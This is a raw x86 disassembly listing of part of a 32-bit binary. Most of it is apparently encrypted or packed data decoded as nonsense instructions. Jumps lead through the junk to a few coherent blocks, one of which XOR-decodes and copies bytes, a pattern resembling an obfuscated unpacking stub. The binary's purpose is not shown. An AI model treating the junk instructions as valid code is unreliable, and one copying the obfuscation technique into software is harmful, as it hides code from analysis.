  405004:	sub    eax,0x75566856
  405009:	in     eax,0x7e
  40500b:	js     0x405062
  40500d:	xor    al,0x3a
  40500f:	lea    esi,[esi]
  405011:	add    edx,DWORD PTR [edi+0x52a9ec0b]
  405017:	dec    si
  405019:	sub    ah,BYTE PTR [esi+0x2e7f19e6]
  40501f:	add    bl,bh
  405021:	push   esi
  405022:	adc    DWORD PTR [eax],ebx
  405024:	mov    al,ds:0x655de5c7
  405029:	push   esi
  40502a:	loope  0x404fe1
  40502c:	xstore-rng (bad)
  40502d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40502e:	les    esi,FWORD PTR [ebx+0x2a]
  405031:	mov    dh,0xf3
  405033:	or     edx,0x9fdcfdb6
  405039:	and    eax,0xc566797b
  40503e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40503f:	inc    esp
  405040:	fstp   QWORD PTR ds:0x673348b5
  405046:	xchg   esi,eax
  405047:	int    0x5d
  405049:	sub    al,0x7f
  40504b:	stc    
  40504c:	cvtdq2ps xmm0,XMMWORD PTR [ebp+0x64]
  405050:	dec    ecx
  405051:	lods   al,BYTE PTR fs:[esi]
  405053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405054:	js     0x405056
  405056:	jae    0x4050c2
  405058:	pop    ebx
  405059:	es stos BYTE PTR es:[edi],al
  40505b:	cld    
  40505c:	inc    eax
  40505d:	push   0x9b144487
  405062:	cmp    DWORD PTR es:[ebp+0x3d],esp
  405066:	lods   al,BYTE PTR ds:[esi]
  405067:	add    DWORD PTR [ebx-0x17540043],ebp
  40506d:	jle    0x405034
  40506f:	xchg   ebp,eax
  405070:	xor    bl,BYTE PTR [edi]
  405072:	rcr    DWORD PTR [eax],0x4f
  405075:	jl     0x405044
  405077:	jg     0x4050db
  405079:	inc    edi
  40507a:	or     eax,0x875df09a
  40507f:	dec    edi
  405080:	xor    DWORD PTR ds:0x11da4796,0x46c9324b
  40508a:	dec    edx
  40508b:	jnp    0x4050d4
  40508d:	mov    DWORD PTR [esi-0x44],esi
  405090:	and    bh,BYTE PTR [ebx]
  405092:	lods   al,BYTE PTR ds:[esi]
  405093:	sbb    ecx,ebp
  405095:	and    ecx,ebp
  405097:	in     eax,0x85
  405099:	es mov ecx,0x842fe2de
  40509f:	jnp    0x405094
  4050a1:	les    eax,FWORD PTR [esi+0x74]
  4050a4:	(bad)  
  4050a6:	adc    DWORD PTR [ebx-0x3829a4e5],ecx
  4050ac:	dec    edi
  4050ad:	adc    DWORD PTR [ecx-0x70],edx
  4050b0:	test   eax,0x638788ae
  4050b5:	mov    ?,WORD PTR [eax+0x32]
  4050b8:	or     DWORD PTR [ecx-0x1],0x62
  4050bc:	add    edx,DWORD PTR [esi+0x1625d494]
  4050c2:	mov    ds:0xeeb32c53,eax
  4050c7:	mov    edi,0xffcd8d68
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx+0x1c3bb8fe],bh
  4050fc:	lods   al,BYTE PTR ds:[esi]
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x405129
  405106:	sub    al,0xab
  405108:	outs   dx,DWORD PTR ds:[esi]
  405109:	jo     0x4050df
  40510b:	push   cs
  40510c:	dec    ebx
  40510d:	add    ah,BYTE PTR [edx+0x21bc048a]
  405113:	out    dx,al
  405114:	and    DWORD PTR [edi],ecx
  405116:	shl    BYTE PTR [ecx+edi*1],1
  405119:	adc    ecx,edi
  40511b:	cmp    bl,ch
  40511d:	or     BYTE PTR [ecx+0x74],0x27
  405121:	push   esi
  405122:	push   edx
  405123:	add    ebx,ebp
  405125:	jmp    DWORD PTR [ebp-0x72]
  405128:	inc    edi
  405129:	adc    eax,0xc5fd0855
  40512e:	pusha  
  40512f:	in     eax,0xe9
  405131:	sub    esp,DWORD PTR [esi+0x5d156a94]
  405137:	xlat   BYTE PTR ds:[ebx]
  405138:	loope  0x40519d
  40513a:	loope  0x405104
  40513c:	jecxz  0x405106
  40513e:	(bad)  [ebx-0x1c]
  405141:	add    DWORD PTR [esi+0x25],edi
  405144:	jbe    0x4050e8
  405146:	mov    edx,0x5588274d
  40514b:	adc    al,0xcb
  40514d:	enter  0xdf56,0x35
  405151:	enter  0x335a,0x4a
  405155:	mov    ebp,0x8d28d024
  40515a:	es adc dl,dh
  40515d:	sub    BYTE PTR [edi+0x4b],ch
  405160:	jno    0x40513f
  405162:	(bad)  
  405163:	addr16 call 0xc6a1ae50
  405169:	xor    ah,BYTE PTR [esi-0x58c9e536]
  40516f:	inc    eax
  405170:	mov    bh,0xcb
  405172:	ss xchg esp,eax
  405174:	adc    edi,DWORD PTR [ebp-0x7e86377e]
  40517a:	(bad)  
  40517b:	repnz xchg ebp,eax
  40517d:	lahf   
  40517e:	mov    ?,WORD PTR [esi-0x6e]
  405181:	jecxz  0x405113
  405183:	dec    ebp
  405184:	mov    eax,ds:0xcafbe8d0
  405189:	es stos DWORD PTR es:[edi],eax
  40518b:	xor    eax,0xcec77d1b
  405190:	fcmovu st,st(1)
  405192:	push   ss
  405193:	(bad)  
  405194:	into   
  405195:	or     BYTE PTR [ecx],bl
  405197:	mov    al,0x6d
  405199:	xchg   ebp,eax
  40519a:	fmul   DWORD PTR [ebx+ebp*2-0x3729d361]
  4051a1:	mov    ah,0xe5
  4051a3:	add    dl,BYTE PTR [eax+0x5634e1d2]
  4051a9:	cmp    esp,esi
  4051ab:	lods   eax,DWORD PTR ds:[esi]
  4051ac:	cmc    
  4051ad:	in     al,0x65
  4051af:	xor    al,BYTE PTR [eax+0x6aefe42c]
  4051b5:	dec    ebx
  4051b6:	and    al,0xf0
  4051b8:	push   0xc651a764
  4051bd:	sub    ebp,ebx
  4051bf:	bound  esi,QWORD PTR [edi]
  4051c1:	in     eax,dx
  4051c2:	cdq    
  4051c3:	test   eax,0x24aa1e7e
  4051c8:	das    
  4051c9:	adc    bl,BYTE PTR [ebx]
  4051cb:	fsubr  st,st(1)
  4051cd:	mov    ch,0xe2
  4051cf:	ss data16 loopne 0x405163
  4051d3:	pop    esp
  4051d4:	out    dx,al
  4051d5:	aas    
  4051d6:	in     eax,0x61
  4051d8:	jne    0x40524a
  4051da:	jns    0x40522e
  4051dc:	into   
  4051dd:	js     0x405240
  4051df:	clc    
  4051e0:	add    eax,esi
  4051e2:	mov    ds:0x493f90ee,eax
  4051e7:	shr    bl,cl
  4051e9:	jns    0x40519f
  4051eb:	add    eax,0x72c0bbe5
  4051f0:	jge    0x4051b4
  4051f2:	es dec ebp
  4051f4:	mov    al,ds:0xfa82b2ea
  4051f9:	out    dx,al
  4051fa:	nop
  4051fb:	mov    dh,0x4
  4051fd:	xchg   esp,eax
  4051fe:	mov    edi,0x5a1c636e
  405203:	mov    ch,0xe6
  405205:	mov    esi,0x4c6117d7
  40520a:	jno    0x4051d6
  40520c:	jae    0x4051ac
  40520e:	sbb    al,0xb1
  405210:	scas   al,BYTE PTR es:[edi]
  405211:	inc    ebx
  405212:	push   esi
  405213:	mov    DWORD PTR [ecx],ebp
  405215:	jo     0x40519c
  405217:	mov    dl,0x6d
  405219:	fwait
  40521a:	les    ebx,FWORD PTR [ecx-0xfa927e2]
  405220:	mov    BYTE PTR [edx+0x200f714d],al
  405226:	mov    ds:0xb8e1e8da,al
  40522b:	sbb    eax,0x182c25e6
  405230:	rcl    BYTE PTR [edi-0xa6aaf37],1
  405236:	mov    edi,DWORD PTR [edx+ecx*8+0x2e13309e]
  40523d:	mov    al,0x96
  40523f:	mov    ds:0xc542f23a,eax
  405244:	cmc    
  405245:	mov    DWORD PTR [edi],esi
  405247:	jmp    0x44f8:0x4373fb7c
  40524e:	jg     0x40526b
  405250:	loope  0x405278
  405252:	adc    dl,0xdb
  405255:	pusha  
  405256:	repnz loopne 0x405264
  405259:	push   ss
  40525a:	je     0x405226
  40525c:	xor    ch,BYTE PTR ds:0x6589a413
  405262:	aas    
  405263:	(bad)  
  405264:	push   0xa7dded68
  405269:	sbb    DWORD PTR [ecx-0x7a06a085],ebx
  40526f:	stc    
  405270:	cdq    
  405271:	loopne 0x4052a4
  405273:	sbb    dh,BYTE PTR [edx+0xfad2830]
  405279:	lods   al,BYTE PTR ds:[esi]
  40527a:	adc    ebp,edi
  40527c:	repnz push edi
  40527e:	jmp    0x56cd7c5a
  405283:	fistp  DWORD PTR [eax+0x7]
  405286:	and    esi,edi
  405288:	pop    es
  405289:	dec    esi
  40528a:	xlat   BYTE PTR ds:[ebx]
  40528b:	jg     0x40526c
  40528d:	add    eax,0x3da7f126
  405292:	test   DWORD PTR [edi+0x774fed62],edx
  405298:	xchg   edx,eax
  405299:	add    al,0x51
  40529b:	or     al,0x48
  40529d:	out    dx,eax
  40529e:	sub    DWORD PTR [edi+0x3a],ebx
  4052a1:	ret    
  4052a2:	or     bl,dl
  4052a4:	fisubr DWORD PTR [ebp-0x3b7024ab]
  4052aa:	or     eax,0x72709f6f
  4052af:	sbb    eax,esi
  4052b1:	mov    ebp,0xdc8c89e
  4052b6:	pop    eax
  4052b7:	outs   dx,DWORD PTR fs:[esi]
  4052b9:	push   ds
  4052ba:	mov    al,0x57
  4052bc:	jecxz  0x405266
  4052be:	sar    DWORD PTR [edi-0x35fa0d4e],0x6
  4052c5:	fldl2t 
  4052c7:	jnp    0x405250
  4052c9:	mov    dh,0xfd
  4052cb:	mov    bl,0x76
  4052cd:	or     BYTE PTR [ebx+0x76],bh
  4052d0:	and    eax,0xfa651ff9
  4052d5:	les    ecx,FWORD PTR [edi+0x7c64afc8]
  4052db:	test   eax,0x7cd60327
  4052e0:	out    0xfd,al
  4052e2:	jnp    0x4052c5
  4052e4:	push   ebx
  4052e5:	adc    bl,BYTE PTR [ebp+0x12]
  4052e8:	push   cs
  4052e9:	jmp    0xa14355d1
  4052ee:	xchg   ch,al
  4052f0:	mov    eax,ds:0xefd77966
  4052f5:	ins    BYTE PTR es:[edi],dx
  4052f6:	cmp    eax,0xffffff89
  4052f9:	sub    eax,0x26d2ed8b
  4052fe:	mov    DWORD PTR [ecx],eax
  405300:	(bad)  [edx]
  405302:	retf   
  405303:	and    dh,0x91
  405306:	iret   
  405307:	ffree  st(2)
  405309:	sbb    BYTE PTR [esi],cl
  40530b:	mov    dh,0x98
  40530d:	xchg   BYTE PTR [esi+0x2dd4ab3e],dl
  405313:	push   eax
  405314:	xchg   ebx,eax
  405315:	imul   edi,DWORD PTR [ecx-0x7dd80d9c],0xe4ed5f80
  40531f:	cdq    
  405320:	and    BYTE PTR [esi+eiz*1-0x54],0x31
  405325:	int    0x1
  405327:	mov    esi,0x6636d678
  40532c:	cld    
  40532d:	pop    esp
  40532e:	aad    0xf3
  405330:	push   ss
  405331:	retf   0x847c
  405334:	mov    ch,0x65
  405336:	sbb    eax,0xda5f21d2
  40533b:	lods   eax,DWORD PTR ds:[esi]
  40533c:	(bad)  
  40533d:	fisttp DWORD PTR [ebp+0x13]
  405340:	ins    BYTE PTR es:[edi],dx
  405341:	cs xchg ecx,eax
  405343:	or     BYTE PTR [ecx-0x71],ch
  405346:	adc    eax,0x3f3cbf11
  40534b:	add    eax,0xa043ee1c
  405350:	stc    
  405351:	cli    
  405352:	loopne 0x405300
  405354:	adc    al,0xf3
  405356:	out    dx,al
  405357:	loopne 0x4053d7
  405359:	sub    DWORD PTR [esi-0x31],0xffffffe2
  40535d:	jg     0x405389
  40535f:	loope  0x40534b
  405361:	nop
  405362:	stos   DWORD PTR es:[edi],eax
  405363:	jg     0x40531d
  405365:	push   es
  405366:	fwait
  405367:	nop
  405368:	imul   esp,DWORD PTR [ecx-0x264c9b40],0x9f380b4b
  405372:	cmp    eax,0xed6efa07
  405377:	push   ebx
  405378:	mov    DWORD PTR [eax],edi
  40537a:	arpl   WORD PTR [edx+0x5515a8f7],dx
  405380:	std    
  405381:	outs   dx,BYTE PTR ds:[esi]
  405382:	fcomp  DWORD PTR [edx+0x74]
  405385:	adc    al,0x5d
  405387:	jne    0x4053df
  405389:	mov    eax,?
  40538b:	ret    
  40538c:	sbb    al,0xd3
  40538e:	cdq    
  40538f:	addr16 jae 0x405365
  405392:	(bad)  
  405393:	hlt    
  405394:	push   0x54a27981
  405399:	hlt    
  40539a:	aam    0xe9
  40539c:	add    dh,BYTE PTR [eax]
  40539e:	push   esi
  40539f:	enter  0x9ff9,0x2c
  4053a3:	dec    ebp
  4053a4:	cmovge edx,edx
  4053a7:	and    ch,BYTE PTR [ebx+ebp*1+0x5d]
  4053ab:	jnp    0x40539a
  4053ad:	fnstenv [edx+0x21]
  4053b0:	fs js  0x405355
  4053b3:	and    BYTE PTR [edx],bl
  4053b5:	stos   BYTE PTR es:[edi],al
  4053b6:	xor    DWORD PTR [edi+0x5a7d5630],ebp
  4053bc:	push   cs
  4053bd:	sbb    DWORD PTR [ecx+0x3],esp
  4053c0:	push   es
  4053c1:	arpl   si,dx
  4053c3:	mov    ch,0x48
  4053c5:	aas    
  4053c6:	xchg   DWORD PTR [edi+0x3aa5249],esi
  4053cc:	in     al,0x1
  4053ce:	in     eax,0xb9
  4053d0:	pop    ebx
  4053d1:	mov    ?,WORD PTR [eax+0x77]
  4053d4:	xchg   ecx,eax
  4053d5:	retf   0x8911
  4053d8:	mov    eax,DWORD PTR [ebp-0x8]
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fmul   st(3),st
  4053ed:	(bad)  
  4053ee:	sbb    eax,0x78353dd3
  4053f3:	js     0x405442
  4053f5:	jle    0x40546f
  4053f7:	js     0x4053ef
  4053f9:	jb     0x405396
  4053fb:	sub    edi,ebx
  4053fd:	xor    esp,DWORD PTR [ebp+0x4e]
  405400:	loope  0x4053a6
  405402:	aam    0xc6
  405404:	hlt    
  405405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405406:	bound  edx,QWORD PTR [ecx-0x20]
  405409:	fild   DWORD PTR ds:[edi+0x6cc22c8d]
  405410:	popa   
  405411:	test   al,0xf5
  405413:	mov    al,ds:0x1b32e4a8
  405418:	arpl   si,ax
  40541a:	(bad)  
  40541b:	shl    edi,1
  40541d:	fwait
  40541e:	lahf   
  40541f:	sbb    ah,BYTE PTR [edi-0x30]
  405422:	mov    eax,ds:0x23353c74
  405427:	jno    0x405458
  405429:	popf   
  40542a:	mov    al,0xa3
  40542c:	aad    0x37
  40542e:	fisttp QWORD PTR [edi-0x2aec3ed6]
  405434:	add    BYTE PTR [esi+edx*4+0x4731e0e4],dh
  40543b:	pop    ss
  40543c:	mov    al,ds:0xe0646eaa
  405441:	mov    esp,DWORD PTR [edx-0x3c9069bf]
  405447:	add    al,0x23
  405449:	cmp    bl,BYTE PTR [ebx+0x7b]
  40544c:	jo     0x405496
  40544e:	add    BYTE PTR [edx-0xa],dh
  405451:	(bad)  
  405452:	neg    DWORD PTR [eax+0x22cae1bb]
  405458:	mov    bl,0x8e
  40545a:	xor    BYTE PTR [edi+0x7],0xa0
  40545e:	dec    DWORD PTR [ebx+edi*1]
  405461:	test   DWORD PTR [ebx+0x4b99cd0b],ecx
  405467:	loope  0x4054b9
  405469:	fstp   st(6)
  40546b:	mov    bh,0xbb
  40546d:	cmp    eax,0x3902b57b
  405472:	fwait
  405473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405474:	ror    BYTE PTR [ecx+eax*2+0x1a4f010e],cl
  40547b:	push   0xffffffcd
  40547d:	call   0xb57b:0xdfc5f5d0
  405484:	call   0xf00b:0x2ade8edc
  40548b:	pop    eax
  40548c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40548d:	fldl2t 
  40548f:	fsub   DWORD PTR [eax]
  405491:	push   ebp
  405492:	pop    esp
  405493:	dec    esp
  405494:	mov    esi,0xb58692f1
  405499:	das    
  40549a:	pop    esp
  40549b:	int3   
  40549c:	mov    bl,0xe6
  40549e:	mov    ds:0xdc8d66b8,al
  4054a3:	xor    ch,BYTE PTR [edi-0x40f7fd9]
  4054a9:	add    ah,BYTE PTR [ebx+0x7f]
  4054ac:	sub    al,0x3a
  4054ae:	push   0xffffffd4
  4054b0:	push   edi
  4054b1:	mov    edi,0xb966fa06
  4054b6:	jp     0x4054a5
  4054b8:	add    ch,dh
  4054ba:	pop    DWORD PTR [ecx+edi*1]
  4054bd:	pushf  
  4054be:	imul   eax,DWORD PTR [esi+0x64],0xffffffa2
  4054c2:	cmp    DWORD PTR [edx-0x7f],ecx
  4054c5:	mov    BYTE PTR [ecx-0xe],bh
  4054c8:	sti    
  4054c9:	and    eax,0x767d7c
  4054ce:	mov    ds:0xe2ee4c9f,eax
  4054d3:	sahf   
  4054d4:	push   ds
  4054d5:	or     eax,DWORD PTR [ebx]
  4054d7:	ds shl DWORD PTR ss:[ecx],1
  4054db:	adc    BYTE PTR ds:0x36281201,al
  4054e1:	inc    edi
  4054e2:	push   es
  4054e3:	clc    
  4054e4:	add    dl,BYTE PTR [eax]
  4054e6:	xchg   edx,eax
  4054e7:	cmc    
  4054e8:	adc    DWORD PTR [ecx],0xfffffff5
  4054eb:	outs   dx,DWORD PTR ds:[esi]
  4054ec:	xor    DWORD PTR [eax-0x39],0xc
  4054f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054f1:	pop    ds
  4054f2:	adc    edx,edx
  4054f4:	inc    ebx
  4054f5:	push   es
  4054f6:	mov    ebx,0xac727490
  4054fb:	dec    esp
  4054fc:	sbb    BYTE PTR [ebp-0x6e],cl
  4054ff:	out    dx,eax
  405500:	rol    eax,1
  405502:	xor    eax,0xebfdb19b
  405507:	or     BYTE PTR [ebp-0x5a],cl
  40550a:	aad    0x87
  40550c:	push   es
  40550d:	(bad)  
  40550e:	mov    al,ds:0x7eadb3c4
  405513:	dec    ebp
  405514:	pop    esp
  405515:	xchg   BYTE PTR [edi-0x57b8de96],dh
  40551b:	scas   al,BYTE PTR es:[edi]
  40551c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551d:	and    BYTE PTR [eax+0x5fb46bf1],al
  405523:	pop    edx
  405524:	xchg   ebp,eax
  405525:	inc    ecx
  405526:	pop    DWORD PTR [esi]
  405528:	xor    bh,dh
  40552a:	or     dl,BYTE PTR [edi+0x5b5f15fe]
  405530:	das    
  405531:	and    ecx,DWORD PTR [ebx-0x8]
  405534:	or     DWORD PTR [edx],ebx
  405536:	in     eax,0x2a
  405538:	cmp    DWORD PTR [eax-0x4f],edi
  40553b:	push   ecx
  40553c:	adc    BYTE PTR [esi+ecx*2-0x5d1994df],al
  405543:	cmp    eax,0xf58dc2d1
  405548:	sti    
  405549:	cmp    BYTE PTR [edx],dh
  40554b:	icebp  
  40554c:	pop    es
  40554d:	add    ah,BYTE PTR [edi]
  40554f:	js     0x40559c
  405551:	mov    DWORD PTR [edx+0x5a],esp
  405554:	lods   eax,DWORD PTR ds:[esi]
  405555:	cmc    
  405556:	pop    ecx
  405557:	jae    0x4055bb
  405559:	jno    0x40550c
  40555b:	shl    bh,1
  40555d:	pop    edi
  40555e:	hlt    
  40555f:	jnp    0x405581
  405561:	enter  0x22ca,0x5a
  405565:	jmp    0x405513
  405567:	mov    eax,ds:0x2670195e
  40556c:	mov    edx,0x2f425d6d
  405571:	in     al,dx
  405572:	nop
  405573:	jae    0x4055b1
  405575:	(bad)  
  405576:	adc    dh,BYTE PTR [edi]
  405578:	shl    DWORD PTR [edx+0x20f141c3],cl
  40557e:	ret    0x8702
  405581:	into   
  405582:	nop
  405583:	jmp    0x4055c1
  405585:	mov    cl,0xbb
  405587:	mov    esp,DWORD PTR [ebp+0x28]
  40558a:	hlt    
  40558b:	hlt    
  40558c:	push   0xffffffa8
  40558e:	mov    ebx,edi
  405590:	ins    BYTE PTR es:[edi],dx
  405591:	mov    esi,0x472a2099
  405596:	pop    ecx
  405597:	push   ds
  405598:	mov    ds:0x4f477980,eax
  40559d:	push   0x63
  40559f:	sbb    BYTE PTR [esi+0x68],0xce
  4055a3:	mov    esi,0x4a5a7e26
  4055a8:	mov    eax,ds:0xa2104414
  4055ad:	into   
  4055ae:	shr    BYTE PTR [ecx],0xc6
  4055b1:	shl    DWORD PTR [eax-0x2e8f82a5],1
  4055b7:	xchg   ebp,eax
  4055b8:	dec    edx
  4055b9:	dec    esi
  4055ba:	push   esi
  4055bb:	mov    esi,DWORD PTR [edx+0x1b886426]
  4055c1:	cmp    DWORD PTR [esp+ebx*8-0x23],ebp
  4055c5:	cwde   
  4055c6:	shl    BYTE PTR [edx-0x40f49344],0x69
  4055cd:	sahf   
  4055ce:	jle    0x4055ab
  4055d0:	xchg   ebp,esp
  4055d2:	xchg   edx,eax
  4055d3:	ins    DWORD PTR es:[edi],dx
  4055d4:	push   0xffffffc4
  4055d6:	fwait
  4055d7:	dec    edi
  4055d8:	lock xlat BYTE PTR ds:[ebx]
  4055da:	test   edx,edx
  4055dc:	nop    DWORD PTR ds:0x99a9c8d2
  4055e3:	cwde   
  4055e4:	fcomp  DWORD PTR [eax]
  4055e6:	push   ss
  4055e7:	cli    
  4055e8:	mov    ds:0xb535a86e,eax
  4055ed:	jmp    0xd7a8:0x274814ef
  4055f4:	xchg   ebx,eax
  4055f5:	sahf   
  4055f6:	jo     0x40562e
  4055f8:	push   0x9e2dfe66
  4055fd:	out    dx,eax
  4055fe:	das    
  4055ff:	push   ecx
  405600:	ret    
  405601:	lods   al,BYTE PTR ds:[esi]
  405602:	lock ficom DWORD PTR [esi-0x20446d78]
  405609:	jae    0x4055b8
  40560b:	inc    ebp
  40560c:	push   ebx
  40560d:	xchg   edx,eax
  40560e:	mov    al,BYTE PTR [ecx]
  405610:	in     al,0x8b
  405612:	push   edx
  405613:	call   DWORD PTR [ecx-0x4a]
  405616:	cli    
  405617:	inc    edi
  405618:	gs pop esi
  40561a:	cmp    al,0x5
  40561c:	add    al,0x4a
  40561e:	xchg   esp,eax
  40561f:	xchg   ecx,eax
  405620:	stos   BYTE PTR es:[edi],al
  405621:	in     eax,dx
  405622:	sahf   
  405623:	adc    ebp,DWORD PTR [ebp+0x46]
  405626:	ficom  DWORD PTR [eax]
  405628:	ins    DWORD PTR es:[edi],dx
  405629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40562a:	test   BYTE PTR ss:[edx-0x1aaea394],ah
  405631:	(bad)  
  405632:	mov    al,ds:0xf8d03348
  405637:	push   edi
  405638:	nop
  405639:	pop    ebx
  40563a:	popf   
  40563b:	(bad)  
  40563c:	clc    
  40563d:	and    edi,DWORD PTR [edi]
  40563f:	xchg   ebx,eax
  405640:	push   esp
  405641:	sbb    eax,0x6250bbe3
  405646:	in     al,0x61
  405648:	fwait
  405649:	mov    eax,0xe3c0d816
  40564e:	mul    BYTE PTR [ecx]
  405650:	mov    ds:0xdeaaad21,al
  405655:	cmp    edi,DWORD PTR [edi-0x70bbc79a]
  40565b:	cmp    ah,BYTE PTR [ebx]
  40565d:	and    BYTE PTR [eax-0x3ced26a5],ch
  405663:	shl    BYTE PTR [ebx-0x7d9c3647],1
  405669:	fisubr WORD PTR [ebx+0x49]
  40566c:	inc    esi
  40566d:	sbb    BYTE PTR [ebx+0x3e],bh
  405670:	jns    0x4056ef
  405672:	out    dx,eax
  405673:	(bad)  
  405674:	mov    eax,ds:0xf6da2358
  405679:	lods   al,BYTE PTR ds:[esi]
  40567a:	into   
  40567b:	test   BYTE PTR [esi],bh
  40567d:	scas   al,BYTE PTR es:[edi]
  40567e:	pop    ebp
  40567f:	in     eax,dx
  405680:	imul   eax,DWORD PTR [ecx-0x56ce46bd],0xfffffff3
  405687:	pop    ecx
  405688:	test   DWORD PTR [edx-0x6a],ecx
  40568b:	pop    esp
  40568c:	mov    ebx,0xb0fb5d7a
  405691:	scas   eax,DWORD PTR es:[edi]
  405692:	mov    esp,0x6abcbd47
  405697:	mov    ebx,0x93c68fde
  40569c:	xor    BYTE PTR ds:0xa8fc7215,dl
  4056a2:	xchg   edx,eax
  4056a3:	scas   al,BYTE PTR es:[edi]
  4056a4:	fist   DWORD PTR ds:0x30355df2
  4056aa:	mov    bh,0x6b
  4056ac:	ss dec esp
  4056ae:	add    al,0xea
  4056b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b1:	fisubr WORD PTR [edi+0x2cba9c42]
  4056b7:	and    DWORD PTR [ecx],esp
  4056b9:	xchg   edi,eax
  4056ba:	pop    ebp
  4056bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056bc:	mov    esp,0x2455c9d7
  4056c1:	jp     0x40568c
  4056c3:	pop    edx
  4056c4:	inc    ebx
  4056c5:	or     eax,0xd0d7fbd9
  4056ca:	stc    
  4056cb:	mov    edi,DWORD PTR [ebp-0x4]
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	leave  
  405713:	add    BYTE PTR [edi-0x50],bh
  405716:	adc    bh,BYTE PTR [edx]
  405718:	js     0x405792
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x4056e4
  40571f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405720:	cwde   
  405721:	(bad)  
  405723:	test   al,0xe8
  405725:	adc    dl,BYTE PTR [ebx-0x1448dab]
  40572b:	int3   
  40572c:	sbb    ch,dl
  40572e:	push   edx
  40572f:	ja     0x4056b7
  405731:	les    ecx,FWORD PTR [ebp+eax*2+0x7f]
  405735:	and    edx,ebp
  405737:	adc    esi,DWORD PTR [ebx]
  405739:	test   dl,cl
  40573b:	sbb    esp,DWORD PTR [edi-0x40]
  40573e:	and    edx,DWORD PTR [esi+0x5532e4de]
  405744:	popf   
  405745:	jae    0x40572e
  405747:	adc    al,0x3e
  405749:	xchg   DWORD PTR [edi+edx*4+0x3c],ebp
  40574d:	jns    0x405771
  40574f:	sub    BYTE PTR [ecx],bl
  405751:	ret    
  405752:	aaa    
  405753:	jmp    0x4056e0
  405755:	jle    0x405780
  405757:	cmc    
  405758:	add    DWORD PTR ds:0x49585fd6,edx
  40575e:	scas   eax,DWORD PTR es:[edi]
  40575f:	mov    eax,0xea034533
  405764:	(bad)  
  405765:	(bad)  
  405766:	cmp    BYTE PTR [ebp-0x758d2bca],bl
  40576c:	xchg   edx,eax
  40576d:	push   0xffffff99
  40576f:	ja     0x405741
  405771:	lods   eax,DWORD PTR ds:[esi]
  405772:	shl    dl,1
  405774:	arpl   bx,di
  405776:	sub    al,0x26
  405778:	sbb    ch,BYTE PTR [eax-0x6e]
  40577b:	xchg   esp,eax
  40577c:	pop    ecx
  40577d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40577e:	push   eax
  40577f:	clc    
  405780:	add    DWORD PTR [ebx+edx*4-0x7fb8b75f],edx
  405787:	jnp    0x40575f
  405789:	icebp  
  40578a:	mov    WORD PTR [esi-0x55],es
  40578d:	enter  0x2a62,0x85
  405791:	dec    ebx
  405792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405793:	pop    ebx
  405794:	(bad)  
  405795:	or     al,0xc5
  405797:	fcompp 
  405799:	adc    ah,BYTE PTR [eax+esi*1+0x52]
  40579d:	lods   al,BYTE PTR ds:[esi]
  40579e:	leave  
  40579f:	clc    
  4057a0:	and    al,0x24
  4057a2:	inc    edi
  4057a3:	popf   
  4057a4:	inc    ebp
  4057a5:	mov    esi,0x1600c64c
  4057aa:	mov    ebx,0xf88caaf
  4057af:	cmc    
  4057b0:	jmp    0x40576c
  4057b2:	sti    
  4057b3:	or     eax,0x8cafe8cc
  4057b8:	push   eax
  4057b9:	arpl   WORD PTR [ecx],bx
  4057bb:	adc    DWORD PTR [esp+ecx*4+0x3e410e85],ebp
  4057c2:	cmp    dh,BYTE PTR [ebx]
  4057c4:	or     esi,ebp
  4057c6:	mov    al,0x34
  4057c8:	loop   0x40578f
  4057ca:	pop    ecx
  4057cb:	ret    0xd226
  4057ce:	pushf  
  4057cf:	xchg   esi,ecx
  4057d1:	mov    dh,0xe4
  4057d3:	adc    DWORD PTR [ebx+0x37cb9791],esp
  4057d9:	and    ebp,edi
  4057db:	adc    eax,0x87b2bf1a
  4057e0:	mov    dh,0xd
  4057e2:	retf   0xa332
  4057e5:	sbb    al,0xb7
  4057e7:	rcr    BYTE PTR [ebp-0x7d],1
